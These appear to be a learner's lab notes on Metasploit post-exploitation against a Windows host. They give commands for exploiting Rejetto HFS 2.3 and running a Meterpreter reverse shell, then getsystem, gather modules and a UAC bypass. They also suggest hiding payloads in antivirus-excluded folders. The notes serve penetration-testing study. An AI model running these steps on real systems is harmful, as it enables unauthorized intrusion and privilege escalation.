- MSF provides us with post exploitation modules 
![[Pasted image 20230828081111.png]]

#### the basics - post exploitation modules 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip `
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
6) Meterpreter session 
	1) `sysinfo` 
	2) `getuid`
	3) `help` a meterpreter session on windows gives you more options
	4) `getsystem` can be used to elevate privileges 
	5) `show_mount` will display drives 
	6) `ps` 
	7) `migrate 2212` (you can migrate to upgrade your meterpreter session to x64 )
	8) `cd C:\\` and  `dir` 
7) upgrade the architecture:  x86 Meterpreter sessions are used on 32-bit systems and offer limited access to system resources, while x64 Meterpreter sessions are used on 64-bit systems and provide greater access to resources and system components.  
	- `search migrate`
	- `use post/windows/manage/migrate` (create new process and migrate to it)
	- `set session 1 `

##### post exploitation modules for windows: 
- `post/windows/gather/win_privs` will enumerate the priviliges of current user we have access to.  
	1) set session  

- `post/windows/gather/enum_logged_on_users` allows us to see what users are currently logged on 
	1) set session  

- `post/windows/gather/checkvm` will tell you if the target system is a virtual machine. If you find out that you are on a virtual machine than you can look into exploit modules to break out of the virtual machine and gain access to host operating system that is hosting the virtual machine. 
	- set session

- `post/windows/gather/enum_applications` will tell us what programs are installed on target system (you can check if the applications are vulnerable - if they are you can use that to elevate your priviliges )

- `loot`  will show you were the results of the modules run is stored 

- `post/windows/gather/enum_av_ecluded`  what folders are not scanned by anti-virus. This is handy because in these folders you can store your exploit code and payloads that you want to transfer to the target and execute on disk without being caught 

-  `post/windows/gather/enum_computers` enumerate computers that are part of the domain that the target is also part of

-  `post/windows/gather/enum_patces`  enumerate installed patches on target system
	- if this does not work: go into session -> `shell` this will give you command prompt -> `systeminfo`
	
- `post/windows/gather/enum_shares` enumerate shares 


-  `post/windows/manage/enabled_rdp` enable rdp on target - it will tell you if rdp is already enabled. 


### Windows Privilege Escalations: Bypassing UAC 

- UAC is a Windows security feature introduced in Windows vista that is used to prevent unauthorized changes from being made to the operating system 
![[Pasted image 20230828134513.png]]
- UAC is used to ensure that changes to the operating system require approval from administrator.
- We can utilize the "windows Escalate UAC Protection Bypass (in Memory Injection)" module to bypass UAC by utilizing the trusted publisher certificate through process injection. it will spawn a second shell that has the UAC flag turned off 
- need 64 bit meterpreter session (set payload)


1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip 
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
	1) set the payload to the 64-bit meterpreter payload because that is what will be required in order to successfully bypass UAC and elevate our priviliges: `set payload windows/x64/meterpreter/reverse_tcp`
6) `sysinfo`  `getuid` (admin not the same as administrator)
7) Try elevate priviliges: `getsystem`
8) what are the priviliges assigned to current user: `getprivs`
9) find out to which group users belongs: 
	1) open shell session: `shell` 
	2) ` net users` 
	3) enumerate users part of group administrators: `net localgroup administrators `
	            if admin is part of administrator group than that means that de admin account can make changes to operating system and do administrative tasks. 
	4) terminate this shell 
10) put meterpreter session in the background
11) bypass UAC:
	1) `use exploit/windows/local/bypassuac_injection `
	2) set payload windows/x64/meterpreter/reverse_tcp 
	4)  set session` id 
	5) `set` `lport` 
	6) when error:` set TARGET Windows\ x64 `
	7) `getuid` when you see your privileges are not elevated (you till admin) than use command: `getsystem`. The `getsystem` command in the beginning did not work due to UAC but now that UAC is disabled the command `getsystem` will be able to elevate your priviliges. 


